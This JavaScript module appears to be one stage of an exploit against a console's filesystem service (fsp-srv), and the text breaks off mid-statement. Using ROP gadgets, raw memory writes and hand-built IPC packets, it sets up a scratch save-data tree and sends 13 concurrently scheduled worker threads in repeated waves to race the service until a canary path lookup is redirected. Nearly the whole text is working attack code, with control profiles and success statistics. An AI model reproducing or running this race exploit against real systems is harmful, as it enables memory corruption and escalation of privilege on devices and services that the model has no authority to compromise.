import coreRuntime from "./runtime.mjs";

// Workflow steps take phase inputs and return phase outputs. The payload entry
// owns the sequence and carries those results between calls.

const {
  CachePlan,
  F_Tick,
  GADGET_MEMCPY,
  GADGET_MEMSET,
  allocPage,
  allocWorkerResources,
  applyCmifContext,
  borrowThreadScheduling,
  buildWaveFrames,
  call_rop,
  cloneFsSession,
  cloneObject,
  closeHandle,
  closeReservationGroup,
  cmifReply,
  createGateBlock,
  executeWave,
  findLastSendIndex,
  findSendForPacket,
  frameArgSlot,
  getMountHandle,
  hex32,
  ipcCommit,
  ipcCreateDirectory,
  ipcCreateFile,
  ipcDeleteDirectoryRecursively,
  ipcFreeSpace,
  ipcGetEntryType,
  ipcStorageGetSize,
  ipcStorageRead,
  log,
  normalizedPath,
  openContentStorage,
  openFspSession,
  openReservationGroup,
  prepPacket,
  read32,
  read64,
  readAllocationCounters,
  removeScratchTree,
  resetWaveState,
  roleSendCode,
  sendIPC,
  write32,
  write64,
  write8,
  writeDirtyData,
  writeStr,
  writeXDesc
} = coreRuntime;

function failedStep(failureReason, failureDetail) {
  return {ok: false, failureReason,
      ...(failureDetail ? {failureDetail} : {})};
}

export async function borrowRawThreadScheduling() {
  let rawScheduling;
    // S1: Borrow raw-thread scheduling.
    rawScheduling = borrowThreadScheduling();
    if (!rawScheduling) {
        await log("FAIL: scheduling");
        return failedStep("raw-thread-scheduling-unavailable");
    }
    await log("SETUP: scheduling ok");

  return {ok: true, rawScheduling};
}

export async function openFspSessions({helpers}) {
  let savedHandle;
  let temporaryHandle;
  let pktBuf;
  let rootSession;
  const handles = {
    auxiliaryStorageHandle: 0,
    candidateHandle: 0,
    extentTriggerHandle: 0,
    extraStorages: [],
    pinHandle: 0,
    rootClones: [],
    saveClones: [],
    storageHandle: 0,
    triggerHandle: 0
  };
    // S2: Root session + two save clones.
    rootSession = openFspSession();
    if (!rootSession) {
        await log("FAIL: fsp-srv");
        return failedStep("fsp-session-open-failed");
    }

    pktBuf = allocPage(0x2000);
    const cleanupHandles = () => helpers.cleanup({
        ...handles, rootSession, savedHandle, temporaryHandle
    });

    var saveMount = getMountHandle("save");
    if (!saveMount) {
        await log("FAIL: no save mount"); cleanupHandles();
        return failedStep("save-mount-unavailable");
    }

    savedHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!savedHandle) {
        await log("FAIL: saved clone"); cleanupHandles();
        return failedStep("save-filesystem-clone-failed");
    }
    temporaryHandle = cloneObject(saveMount.handle, saveMount.objId);
    if (!temporaryHandle) {
        await log("FAIL: temporary clone"); cleanupHandles();
        return failedStep("temporary-filesystem-clone-failed");
    }

  return {ok: true, pktBuf, handles: {
      ...handles, rootSession, savedHandle, temporaryHandle
  }};
}

export async function createScratchTree({
  config,
  helpers,
  handleResources,
  savedHandle,
  temporaryHandle
}) {
  let SCRATCH_DIR;
  let abortControlCanonical;
  let canaryPath;
  let dirtyFilePath;
  let segments;
  let selectedDir;
  let setupPath;
  let setupPkt;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        savedHandle, temporaryHandle
    });
    // S3: Scratch tree.
    SCRATCH_DIR = "/hole";
    dirtyFilePath = SCRATCH_DIR + "/commit_data";
    canaryPath = normalizedPath(SCRATCH_DIR + "/canary", config.CANARY_LENGTH);
    selectedDir = SCRATCH_DIR + "/selected";
    var segmentSalt = Number(call_rop(F_Tick) & 0x1FFFFFFFFFFFn).toString(10);
    segments = ["S0_" + segmentSalt, "S1_" + segmentSalt, "S2_" + segmentSalt];
    var markerPath = SCRATCH_DIR + "/" + segments[0] + "/" + segments[1] +
        "/" + segments[2] + "/SPAN_MARKER";

    var scratchBefore = ipcGetEntryType(savedHandle, SCRATCH_DIR);
    if (scratchBefore.error !== 0x202) {
        await log("FAIL: /hole must be absent; run 019a_cleanup_hole.js after restart; result=" +
            hex32(scratchBefore.error));
        cleanupHandles();
        return failedStep("scratch-path-must-be-absent",
            "result=" + hex32(scratchBefore.error));
    }
    var spaceBefore = ipcFreeSpace(savedHandle, "/");
    if (spaceBefore.error !== 0 || spaceBefore.bytes <= config.DIRTY_FILE_SIZE + 0x500000) {
        await log("FAIL: insufficient free space");
        cleanupHandles();
        return failedStep("insufficient-save-free-space",
            "result=" + hex32(spaceBefore.error) + "; bytes=" +
            spaceBefore.bytes + "; requiredMoreThan=" +
            (config.DIRTY_FILE_SIZE + 0x500000));
    }

    var scratchRootResult = ipcCreateDirectory(savedHandle, SCRATCH_DIR);
    var scratchCommitResult = scratchRootResult === 0
        ? ipcCommit(savedHandle) : null;
    if (scratchRootResult !== 0 || scratchCommitResult !== 0) {
        await log("FAIL: scratch root");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("scratch-root-create-or-commit-failed",
            "create=" + hex32(scratchRootResult) + "; commit=" +
            (scratchCommitResult === null ? "not-run" :
                hex32(scratchCommitResult)));
    }
    var dirtyFileResult = ipcCreateFile(savedHandle, dirtyFilePath,
        config.DIRTY_FILE_SIZE);
    if (dirtyFileResult !== 0) {
        await log("FAIL: commit_data");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("dirty-file-create-failed",
            "result=" + hex32(dirtyFileResult));
    }

    // Canary chain.
    var canaryParts = canaryPath.slice(1).split("/");
    var canaryOk = true;
    var canaryDirectories = 0;
    var canaryMkdirFailure = null;
    for (var i = 2; i < canaryParts.length; i++) {
        var rc = ipcCreateDirectory(savedHandle, "/" + canaryParts.slice(0, i).join("/"));
        if (rc !== 0 && (rc & 0x3FFFFF) !== 0x402) {
            canaryOk = false;
            canaryMkdirFailure = {index: i, pathLength: canaryParts
                .slice(0, i).join("/").length + 1, result: rc};
            break;
        }
        canaryDirectories++;
    }
    var canaryCreateResult = canaryOk
        ? ipcCreateFile(savedHandle, canaryPath, 1) : 0xFFFFFFFF;
    if (!canaryOk || canaryCreateResult !== 0) {
        await log("FAIL: canary chain pathLen=" + canaryPath.length +
            " dirs=" + canaryDirectories + "/" + (canaryParts.length - 2) +
            (canaryMkdirFailure ? " mkdirAt=" + canaryMkdirFailure.index +
                " mkdirLen=" + canaryMkdirFailure.pathLength +
                " mkdirResult=" + hex32(canaryMkdirFailure.result) : "") +
            " create=" + hex32(canaryCreateResult));
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("canary-chain-create-failed",
            "pathLen=" + canaryPath.length + "; dirs=" +
            canaryDirectories + "/" + (canaryParts.length - 2) +
            (canaryMkdirFailure ? "; mkdirAt=" + canaryMkdirFailure.index +
                "; mkdirLen=" + canaryMkdirFailure.pathLength +
                "; mkdirResult=" + hex32(canaryMkdirFailure.result) : "") +
            "; create=" + hex32(canaryCreateResult));
    }
    // Empty-path abort control result.
    setupPkt = allocPage(0x2000);
    setupPath = allocPage(0x1000);
    write8(setupPath, 0n);
    prepPacket(setupPkt, (4 | (1 << 16)) >>> 0, 8, []);
    writeXDesc(setupPkt, 8, setupPath, 1);
    write32(setupPkt + 0x10n, 0x49434653n);
    write32(setupPkt + 0x18n, 7n);
    var abortTransport = Number(sendIPC(savedHandle, setupPkt)) >>> 0;
    if (abortTransport !== 0) {
        await log("FAIL: abort control transport");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("abort-control-transport-failed",
            "transport=" + hex32(abortTransport));
    }
    abortControlCanonical = cmifReply(setupPkt).result & 0x3FFFFF;

    // Selected directory and SPAN tree via temporary.
    var selectedDirectoryResult = ipcCreateDirectory(savedHandle, selectedDir);
    if (selectedDirectoryResult !== 0) {
        await log("FAIL: selected dir");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("selected-directory-create-failed",
            "result=" + hex32(selectedDirectoryResult));
    }
    var running = SCRATCH_DIR;
    for (var i = 0; i < segments.length; i++) {
        running += "/" + segments[i];
        var spanDirectoryResult = ipcCreateDirectory(temporaryHandle, running);
        if (spanDirectoryResult !== 0) {
            await log("FAIL: span dir " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("span-directory-create-failed",
                "index=" + i + "; result=" + hex32(spanDirectoryResult));
        }
    }
    var spanMarkerResult = ipcCreateFile(temporaryHandle, markerPath, 1);
    if (spanMarkerResult !== 0) {
        await log("FAIL: SPAN_MARKER");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("span-marker-create-failed",
            "result=" + hex32(spanMarkerResult));
    }
    await log("SETUP: scratch tree ready canaryPathLen=" + canaryPath.length +
        " dirs=" + canaryDirectories + " create=" + hex32(canaryCreateResult));

  return {ok: true, SCRATCH_DIR, abortControlCanonical, canaryPath,
      canaryDirectories, canaryCreateResult, dirtyFilePath, segments,
      selectedDir, setupPath, setupPkt};
}

export async function openStorageAndClones({
  helpers,
  handleResources,
  SCRATCH_DIR,
  rootSession,
  savedHandle
}) {
    let storageHandle;
    const saveClones = [];
    const rootClones = [];
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        storageHandle, saveClones, rootClones
    });
    // S4: Primary IStorage + clones.
    storageHandle = openContentStorage(rootSession);
    if (!storageHandle) {
        await log("FAIL: primary IStorage");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("primary-storage-open-failed");
    }

    for (var i = 0; i < 6; i++) {
        var h = cloneFsSession(savedHandle);
        if (!h) { await log("FAIL: save clone " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("save-filesystem-clone-failed",
                "index=" + i); }
        saveClones.push(h);
    }
    for (var i = 0; i < 4; i++) {
        var h = cloneFsSession(rootSession);
        if (!h) { await log("FAIL: root clone " + i);
            removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
            return failedStep("root-filesystem-clone-failed",
                "index=" + i); }
        rootClones.push(h);
    }

  return {ok: true, rootClones, saveClones, storageHandle};
}

export async function openTriggerHandles({
  helpers,
  handleResources,
  SCRATCH_DIR,
  savedHandle,
  temporaryHandle
}) {
    let triggerHandle;
    let extentTriggerHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        triggerHandle, extentTriggerHandle
    });
    // S5: Trigger handles.
    triggerHandle = cloneFsSession(savedHandle);
    extentTriggerHandle = cloneFsSession(temporaryHandle);
    if (!triggerHandle || !extentTriggerHandle) {
        await log("FAIL: trigger clones");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("trigger-handle-clone-failed",
            "trigger=" + Boolean(triggerHandle) + "; extent=" +
            Boolean(extentTriggerHandle));
    }

  return {ok: true, extentTriggerHandle, triggerHandle};
}

export function allocatePacketBuffers({
  config,
  SCRATCH_DIR,
  canaryPath
}) {
  let canaryBufMem;
  let extentTotal;
  let fillerBuf0;
  let fillerBuf1;
  let fillerDst;
  let fillerSrc;
  let fragmentBufs;
  let guardBuf0;
  let guardBuf1;
  let guardPath;
  let guardPathC;
  let triggerBuf;
    // S6: Packet buffers.
    extentTotal = config.EXTENT_SIZE + 1;
    triggerBuf = allocPage(0x2000);
    fragmentBufs = [];
    for (var i = 0; i < 4; i++) fragmentBufs.push(allocPage(0x2000));

    canaryBufMem = allocPage(0x1000);
    writeStr(canaryBufMem, canaryPath);

    guardPath = normalizedPath(SCRATCH_DIR + "/absent", 0x300);
    guardPathC = guardPath.slice(0, -1) + "C";
    guardBuf0 = allocPage(0x1000);
    guardBuf1 = allocPage(0x1000);
    writeStr(guardBuf0, guardPath);
    writeStr(guardBuf1, guardPathC);

    fillerSrc = "/NS2_SRC00000000";
    fillerDst = normalizedPath(SCRATCH_DIR + "/page_absent", 0x7EF);
    fillerBuf0 = allocPage(0x1000);
    fillerBuf1 = allocPage(0x1000);
    writeStr(fillerBuf0, fillerSrc);
    writeStr(fillerBuf1, fillerDst);

  return {ok: true, canaryBufMem, extentTotal, fillerBuf0, fillerBuf1, fillerDst, fillerSrc, fragmentBufs, guardBuf0, guardBuf1, guardPath, guardPathC, triggerBuf};
}

export function buildIpcRequests({
  config,
  canaryBufMem,
  canaryPath,
  fillerBuf0,
  fillerBuf1,
  fragmentBufs,
  guardBuf0,
  guardBuf1,
  triggerBuf
}) {
  let REQ;
  let clearPkt;
  let pinPkt;
  let prePkt;
    // S7: IPC request packets.
    REQ = [];
    for (var i = 0; i < 13; i++) REQ.push(allocPage(0x2000));

    // Role 0: Commit (cmd 10)
    prepPacket(REQ[0], 4, 8, [[16, 0x49434653], [24, 10]]);

    // Role 1: IStorage::Read (cmd 0) with B descriptor
    var bottleneckRecv = allocPage(config.WAVE_READ_SIZE + 0x2000);
    prepPacket(REQ[1], (4 | (1 << 24)) >>> 0, 0x0C, []);
    write32(REQ[1] + 8n, BigInt(config.WAVE_READ_SIZE));
    write32(REQ[1] + 12n, BigInt(Number(bottleneckRecv & 0xFFFFFFFFn)));
    write32(REQ[1] + 16n, BigInt(((1 | (Number((bottleneckRecv >> 36n) & 7n) << 2) |
        (Number((bottleneckRecv >> 32n) & 15n) << 28)) >>> 0)));
    write32(REQ[1] + 0x20n, 0x49434653n);
    write32(REQ[1] + 0x28n, 0n);
    write64(REQ[1] + 0x30n, 0n);
    write64(REQ[1] + 0x38n, BigInt(config.WAVE_READ_SIZE));

    // Roles 2-5: fragment cmd 1002
    for (var i = 0; i < 4; i++) {
        prepPacket(REQ[2 + i], (4 | (1 << 16)) >>> 0, 8,
            [[16, 0x49434653], [24, 1002]]);
        writeXDesc(REQ[2 + i], 8, fragmentBufs[i], config.SLOT_SIZE);
    }

    // Role 6: canary GetEntryType (cmd 7)
    prepPacket(REQ[6], (4 | (1 << 16)) >>> 0, 8, [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[6], 8, canaryBufMem, canaryPath.length + 1);

    // Roles 7-8: filler RenameFile (cmd 5)
    for (var idx = 7; idx <= 8; idx++) {
        prepPacket(REQ[idx], (4 | (2 << 16)) >>> 0, 8,
            [[32, 0x49434653], [40, 5]]);
        writeXDesc(REQ[idx], 8, fillerBuf0, 16);
        writeXDesc(REQ[idx], 16, fillerBuf1, 0x7F0, 1);
    }

    // Role 9 support packets: pin, clear, pre-release
    pinPkt = allocPage(0x2000);
    clearPkt = allocPage(0x2000);
    prePkt = allocPage(0x2000);
    prepPacket(pinPkt, 4, 8, [[16, 0x49434653], [24, 200]]);
    write32(pinPkt, 6n); write32(pinPkt + 20n, 1n); write32(pinPkt + 28n, 9n);
    prepPacket(clearPkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(clearPkt, 6n); write32(clearPkt + 20n, 1n); write32(clearPkt + 28n, 9n);
    prepPacket(prePkt, 4, 8, [[16, 0x49434653], [24, 1009]]);
    write32(prePkt, 6n); write32(prePkt + 20n, 1n); write32(prePkt + 28n, 9n);

    // Role 9: CloseObject
    prepPacket(REQ[9], 4, 8, []);
    write8(REQ[9] + 16n, 2n);
    write32(REQ[9] + 20n, 0n);
    write32(REQ[9] + 28n, 0n);

    // Roles 10-11: guard RenameFile (cmd 5)
    prepPacket(REQ[10], (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[10], 8, guardBuf0, 0x301);
    writeXDesc(REQ[10], 16, guardBuf1, 0x301, 1);
    prepPacket(REQ[11], (4 | (2 << 16)) >>> 0, 8,
        [[32, 0x49434653], [40, 5]]);
    writeXDesc(REQ[11], 8, guardBuf0, 0x301);
    writeXDesc(REQ[11], 16, guardBuf1, 0x301, 1);

    // Role 12: trigger GetEntryType (cmd 7)
    prepPacket(REQ[12], (4 | (1 << 16)) >>> 0, 8,
        [[16, 0x49434653], [24, 7]]);
    writeXDesc(REQ[12], 8, triggerBuf, config.SLOT_SIZE);

  return {ok: true, REQ, clearPkt, pinPkt, prePkt};
}

export async function checkPathPair({
  helpers,
  handleResources,
  SCRATCH_DIR,
  fillerDst,
  fillerSrc,
  guardPath,
  guardPathC,
  rootSession,
  savedHandle
}) {
    let auxiliaryStorageHandle;
    const cleanupHandles = () => helpers.cleanup({
        ...handleResources,
        auxiliaryStorageHandle
    });
    // S8: Path-pair control.
    var fillerControlOk = await helpers.checkPathPairQuiet(
        fillerSrc, 16, fillerDst, 0x7F0, {savedHandle});
    var guardControlOk = fillerControlOk
        ? await helpers.checkPathPairQuiet(
            guardPath, 0x301, guardPathC, 0x301, {savedHandle})
        : null;
    var controlOk = Boolean(fillerControlOk && guardControlOk);
    if (!controlOk) {
        await log("FAIL: path-pair control");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("path-pair-control-failed",
            "filler=" + Boolean(fillerControlOk) + "; guard=" +
            (guardControlOk === null ? "not-run" : Boolean(guardControlOk)));
    }

    // Auxiliary IStorage.
    auxiliaryStorageHandle = openContentStorage(rootSession);
    if (!auxiliaryStorageHandle) {
        await log("FAIL: auxiliary IStorage");
        removeScratchTree(savedHandle, SCRATCH_DIR); cleanupHandles();
        return failedStep("auxiliary-storage-open-failed");
    }

  return {ok: true, auxiliaryStorageHandle};
}

export function applyCmifContexts({
  REQ,
  clearPkt,
  pinPkt,
  prePkt
}) {
    // S9: CMIF contexts.
    for (var i = 0; i < 13; i++) {
        var ctx = (i === 0 || (i >= 2 && i <= 5)) ? 3 : 9;
        if (i !== 9) applyCmifContext(REQ[i], ctx);
    }
    applyCmifContext(pinPkt, 9);
    applyCmifContext(clearPkt, 9);
    applyCmifContext(prePkt, 9);

  return {ok: true};
}

export async function prepareWaveInfrastructure({
  helpers,
  REQ,
  clearPkt,
  pinPkt,
  prePkt,
  rootClones,
  saveClones,
  storageHandle,
  triggerBuf,
  triggerHandle,
  config,
  rootSession
}) {
  let clearSendIndex;
  let gates;
  let pinSendIndex;
  let preSendIndex;
  let roleHandles;
  let sendIndices;
  let waveData;
  let waveExtra;
  let workerResources;
    // S10: Wave infrastructure.
    roleHandles = [
        saveClones[0], storageHandle, rootClones[0], rootClones[1],
        rootClones[2], rootClones[3], saveClones[1], saveClones[2],
        saveClones[3], 0, saveClones[4], saveClones[5], triggerHandle
    ];

    gates = createGateBlock();
    var plans = helpers.buildPlans({config: config, REQ, clearPkt,
        gates, pinPkt, prePkt, roleHandles,
        rootSession: rootSession, triggerBuf});
    sendIndices = plans.map(findLastSendIndex);
    pinSendIndex = findSendForPacket(plans[9], pinPkt);
    clearSendIndex = findSendForPacket(plans[9], clearPkt);
    preSendIndex = findSendForPacket(plans[9], prePkt);

    waveData = buildWaveFrames(plans, REQ, triggerBuf, sendIndices);
    workerResources = allocWorkerResources(13);

    var pinBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, pinBk, pinPkt, 0x1000n);
    var clearBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, clearBk, clearPkt, 0x1000n);
    var preBk = allocPage(0x2000); call_rop(GADGET_MEMCPY, preBk, prePkt, 0x1000n);

    waveExtra = {
        packets: [
            { pkt: pinPkt, backup: pinBk },
            { pkt: clearPkt, backup: clearBk },
            { pkt: prePkt, backup: preBk }
        ],
        triggerBuf: triggerBuf,
        triggerFirstByte: 0x2F
    };
    await log("SETUP: " + waveData.frames.length + " workers ready");

  return {ok: true, clearSendIndex, gates, pinSendIndex, preSendIndex, roleHandles, sendIndices, waveData, waveExtra, workerResources};
}

export async function runControlWaveLoop({
  config,
  helpers,
  REQ,
  dirtyFilePath,
  extentTriggerHandle,
  gates,
  pinHandle,
  pinPkt,
  pktBuf,
  rawScheduling,
  rootSession,
  savedHandle,
  sendIndices,
  triggerHandle,
  waveData,
  waveExtra,
  workerResources,
  SCRATCH_DIR,
  extentTotal,
  fragmentBufs,
  segments,
  selectedDir,
  triggerBuf,
  clearPkt,
  clearSendIndex,
  pinSendIndex,
  prePkt,
  preSendIndex,
  abortControlCanonical,
  canaryPath,
  setupPath,
  setupPkt,
  reportProgress = null
}) {
  let canaryQualified;
  let dirtyWriteBuf;
  let dirtyWritePkt;
  let pinFirstWaveQualified;
  let wavesJoined;
  let wavesStarted;
  let workerStateSafe;
  let nextProfile;
  let workflowStopReason = null;
    // S11: Control wave loop — the same state machine as the reference run.
    pinFirstWaveQualified = false;
    var abortControlPassed = false;
    var abortHoleControlPassed = false;
    var extentQualified = false;
    var negativeControlPassed = false;
    canaryQualified = false;
    workerStateSafe = true;
    nextProfile = "abort-control";
    var profileCounts = Object.create(null);
    var positiveWindows = 0;
    var positiveWindowFlips = 0;
    var positiveObservedRedirects = 0;
    var positiveOutsideWindowFlips = 0;
    var positiveQualifiedFlips = 0;
    var positiveHealthFailures = 0;
    var positiveGateFailures = Object.create(null);
    var positiveWindowRecords = [];
  var pinQualificationDiagnostics = null;
    wavesStarted = 0;
    wavesJoined = 0;
    dirtyWriteBuf = allocPage(config.DIRTY_FILE_SIZE + 0x2000);
    call_rop(GADGET_MEMSET, dirtyWriteBuf, 0x66n, BigInt(config.DIRTY_FILE_SIZE));
    dirtyWritePkt = allocPage(0x2000);

    for (var attempt = 0; attempt < config.MAX_CONTROL_WAVES; attempt++) {
        if (canaryQualified) break;
        var profile = nextProfile;

        if (!writeDirtyData(savedHandle, dirtyFilePath, config.DIRTY_FILE_SIZE,
                dirtyWriteBuf, dirtyWritePkt)) {
            workflowStopReason = "dirty-write-failed-at-wave-" + (attempt + 1);
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " dirty write");
            break;
        }

        resetWaveState(waveData.frames, waveData.backups, REQ, waveData.pktBackups,
            gates, waveExtra);
        if (profile === "abort-control") write32(gates.completedFlag, 1n);
        if (profile === "abort-hole-control") write32(gates.bottleneckFinished, 1n);
        var profileSetup = helpers.configureProfile(profile, {config, REQ,
            SCRATCH_DIR: SCRATCH_DIR, extentTotal: extentTotal,
            fragmentBufs: fragmentBufs, segments: segments,
            selectedDir: selectedDir, triggerBuf: triggerBuf});
        if (!profileSetup.configured) {
            workflowStopReason = "profile-setup-failed-" + profile;
            break;
        }

        var group = openReservationGroup(rootSession, pktBuf, 59);
        if (!group.ok) {
            workflowStopReason = "reservation-failed-at-wave-" + (attempt + 1);
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " reservation");
            break;
        }

        prepPacket(REQ[9], 4, 8, []);
        write8(REQ[9] + 0x10n, 2n);
        write32(REQ[9] + 0x14n, BigInt(group.outer));
        write32(REQ[9] + 0x1Cn, 0n);
        write64(frameArgSlot(waveData.frames[9].frame, waveData.frames[9].count,
            sendIndices[9], 0), BigInt(group.session));

        var extentProfile = profile === "extent-absent" || profile === "extent-present";
        write64(frameArgSlot(waveData.frames[12].frame, waveData.frames[12].count,
            sendIndices[12], 0),
            BigInt(extentProfile ? extentTriggerHandle : triggerHandle));

        var createPinThisWave = !pinHandle;
        write32(pinPkt + 0x18n, BigInt(createPinThisWave ? 200 : 1009));

        var wave = executeWave(waveData.frames, rawScheduling, workerResources,
            gates, sendIndices);
        wavesStarted += wave.started === 13 ? 1 : 0;

        if (wave.created < 13 || wave.started < 13) {
            workflowStopReason = "worker-start-failed-at-wave-" + (attempt + 1);
            var relCode = roleSendCode(waveData.frames, 9, sendIndices[9]);
            closeReservationGroup(group, wave.created < 13 || relCode !== 0, pktBuf);
            workerStateSafe = wave.created === 0 ||
                (wave.started === wave.created && wave.joined === wave.created);
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " workers=" +
                wave.created + "/" + wave.started + " joined=" + wave.joined +
                " cleanupSafe=" + workerStateSafe);
            break;
        }
        if (wave.joined < 13) {
            workflowStopReason = "worker-join-failed-at-wave-" + (attempt + 1);
            workerStateSafe = false;
            await log("FAIL: W" + helpers.pad2(attempt + 1) + " join=" + wave.joined + "/13");
            break;
        }
        wavesJoined++;

        var wResult = helpers.analyzeWave(profile, wave, waveData, group,
            createPinThisWave, {
                config, REQ, clearPkt: clearPkt, clearSendIndex: clearSendIndex,
                gates, pinFirstWaveQualified, pinHandle, pinPkt,
                pinSendIndex: pinSendIndex, pktBuf, prePkt: prePkt,
                preSendIndex: preSendIndex, rootSession, sendIndices,
                abortControlCanonical: abortControlCanonical,
                canaryPath: canaryPath, savedHandle, setupPath: setupPath,
                setupPkt: setupPkt
            });
        pinHandle = wResult.pinHandle;
        pinFirstWaveQualified = wResult.pinFirstWaveQualified;
        if (createPinThisWave)
            pinQualificationDiagnostics = wResult.pinDiagnostics;

        profileCounts[profile] = (profileCounts[profile] || 0) + 1;
        if (profile === "positive") {
            if (wResult.observedCanaryRedirect) {
                positiveObservedRedirects++;
                if (wResult.window) positiveWindowFlips++;
                else positiveOutsideWindowFlips++;
            }
            if (wResult.window) positiveWindows++;
            if (wResult.canaryRedirect) positiveQualifiedFlips++;
            if (!wResult.postCanaryHealth.healthy) positiveHealthFailures++;
            for (var ri = 0; ri < wResult.rejections.length; ri++) {
                var rejection = wResult.rejections[ri];
                positiveGateFailures[rejection] =
                    (positiveGateFailures[rejection] || 0) + 1;
            }
            positiveWindowRecords.push({
                wave: attempt + 1,
                window: wResult.window,
                shape: wResult.shape,
                shapeMissing: wResult.shapeMissing.slice(),
                marginUs: wResult.marginUsRaw,
                marginSlackUs: wResult.marginSlackUs,
                preReleaseUsed: wResult.preReleaseUsed,
                preReleaseSlackBytes: wResult.preReleaseSlackBytes,
                rejections: wResult.rejections.slice(),
                canaryResult: wResult.canaryResult,
                canaryType: wResult.canaryType,
                observedRedirect: wResult.observedCanaryRedirect,
                qualifiedFlip: wResult.canaryRedirect,
                postHealthy: wResult.postCanaryHealth.healthy,
                postCanaryHealth: {...wResult.postCanaryHealth},
                triggerResult: wResult.triggerResult,
                triggerType: wResult.triggerType,
                triggerAborted: wResult.triggerAborted,
                roleTimings: wResult.roleTimings,
                changedPaths: wResult.changedPaths.slice(),
                guardSamples: {...wResult.guardSamples}
            });
        }

        var releaseWasSent = roleSendCode(waveData.frames, 9, sendIndices[9]) === 0;
        closeReservationGroup(group, !releaseWasSent, pktBuf);

        if (profile === "abort-control") {
            abortControlPassed = pinFirstWaveQualified && wResult.abortControl;
            if (!pinFirstWaveQualified && pinHandle) {
                closeHandle(pinHandle); pinHandle = 0;
            }
            nextProfile = abortControlPassed ? "abort-hole-control" : "abort-control";
        } else if (profile === "abort-hole-control") {
            abortHoleControlPassed = wResult.abortHoleControl;
            nextProfile = abortHoleControlPassed ? "extent-absent" : "abort-hole-control";
        } else if (profile === "extent-absent") {
            nextProfile = "extent-present";
        } else if (profile === "extent-present") {
            extentQualified = wResult.extentQualified;
            nextProfile = extentQualified ? "negative" : "extent-present";
        } else if (profile === "negative") {
            negativeControlPassed = wResult.negativeControl;
            nextProfile = negativeControlPassed ? "positive" : "negative";
        } else if (profile === "positive") {
            canaryQualified = wResult.canaryRedirect;
            nextProfile = "positive";
        }

        var verdict = "?";
        if (profile === "abort-control") verdict = abortControlPassed ? "control passed" : "retry control";
        else if (profile === "abort-hole-control") verdict = abortHoleControlPassed ? "hole control passed" : "retry control";
        else if (profile === "extent-absent") verdict = "absent-path result recorded";
        else if (profile === "extent-present") verdict = extentQualified ? "marker control passed" : "retry control";
        else if (profile === "negative") verdict = negativeControlPassed ? "negative control passed" : "retry control";
        else if (profile === "positive") verdict = canaryQualified ? "canary redirected" : "no redirect";

        await log(helpers.formatWaveSummaryLine(attempt + 1, profile, wResult,
            verdict, {config}));

        if (profile === "positive" && reportProgress) {
            var positiveOutcome = canaryQualified ? "qualified flip" :
                wResult.observedCanaryRedirect
                    ? "raw redirect outside the qualified window" :
                wResult.window ? "qualified window, no flip" :
                "no qualified window";
            // Report only after wave timing analysis, so no in-wave timing
            // gate or measured window is affected by the progress log.
            await reportProgress("Canary positive attempt " +
                profileCounts.positive + ": " + positiveOutcome +
                "; qualified windows=" + positiveWindows +
                "; observed redirects=" + positiveObservedRedirects + ".");
        }

    }

    await log("CANARY: " + (canaryQualified ? "OK" : "FAIL") +
        " (" + wavesJoined + " waves)");
    var controlsQualified = pinFirstWaveQualified && abortControlPassed &&
        abortHoleControlPassed && extentQualified && negativeControlPassed;
    var campaignState = !workerStateSafe ? "worker-unsafe" :
        positiveHealthFailures > 0 ? "post-health-failure" :
        canaryQualified ? "flip-qualified" :
        controlsQualified && positiveWindows > 0 ? "window-valid-no-flip" :
        controlsQualified && positiveOutsideWindowFlips > 0
            ? "raw-flip-outside-window" :
        controlsQualified ? "no-qualified-positive-window" :
        "controls-incomplete";
    var positiveGateSummary = Object.keys(positiveGateFailures).sort()
        .map(function(key) { return key + "=" + positiveGateFailures[key]; })
        .join(",");
    await log("CANARY STATE: " + campaignState + " controls=" +
        (controlsQualified ? "pass" : "incomplete"));
    await log("CANARY STATS: abort-control=" +
        (profileCounts["abort-control"] || 0) +
        " abort-hole=" + (profileCounts["abort-hole-control"] || 0) +
        " extent-absent=" + (profileCounts["extent-absent"] || 0) +
        " extent-present=" + (profileCounts["extent-present"] || 0) +
        " negative=" + (profileCounts.negative || 0) +
        " positive=" + (profileCounts.positive || 0) +
        " | positive windows=" + positiveWindows +
        " gate-rejections=" + (positiveGateSummary || "none") +
        " windows=" + positiveWindows +
        " raw-flips=" + positiveObservedRedirects +
        " outside-window=" + positiveOutsideWindowFlips +
        " in-window-flips=" + positiveWindowFlips +
        " qualified=" + positiveQualifiedFlips +
        " post-health-fail=" + positiveHealthFailures +
        " conditional-rate=" + (positiveWindows
            ? (100 * positiveWindowFlips / positiveWindows).toFixed(1) + "%"
            : "NA") +
        " next=" + (canaryQualified ? "done" : nextProfile) +
        " cap=" + config.MAX_CONTROL_WAVES);

  return {ok: true, canaryQualified, dirtyWriteBuf, dirtyWritePkt,
      pinFirstWaveQualified, pinHandle, wavesJoined, wavesStarted,
      workerStateSafe, campaignState, controlsQualified, nextProfile,
      workflowStopReason,
      profileCounts,
      abortControlPassed, abortHoleControlPassed, extentQualified,
